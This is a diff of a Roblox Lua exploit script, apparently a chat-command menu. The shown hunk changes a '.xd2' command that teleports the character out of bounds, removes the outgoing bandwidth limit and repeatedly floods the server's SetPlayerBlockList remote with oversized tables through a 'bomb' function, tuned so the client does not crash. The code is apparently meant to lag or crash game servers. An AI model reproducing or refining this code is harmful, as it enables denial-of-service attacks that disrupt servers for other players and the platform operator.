@@ -561,18 +561,19 @@ Character.HumanoidRootPart.Anchored = true
     end
 		end
 		if (msg == ".xd2") then
-			local char = game:GetService('Players').LocalPlayer.Character or nil
+local char = game:GetService('Players').LocalPlayer.Character or nil
 if char then
 char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,17876)
 task.wait(0.1)
 char.HumanoidRootPart.Anchored = true
 end
-while wait() do --// don't change it's the best
+while wait(5) do --// don't change it's the best
 game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
 local function getmaxvalue(val)
    local mainvalueifonetable = 499999
    if type(val) ~= "number" then
        return nil
+-- this crashed
    end
    local calculateperfectval = (mainvalueifonetable/(val+2))
    return calculateperfectval
@@ -608,8 +609,8 @@ for i = 1, tries do
      game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
 end
 end
- wait(5)
-bomb(220, 5) --// change values if client crashes
+ 
+bomb(220, 4) --// change values if client crashes
 end
 end
 			if (msg == ".rhand") then
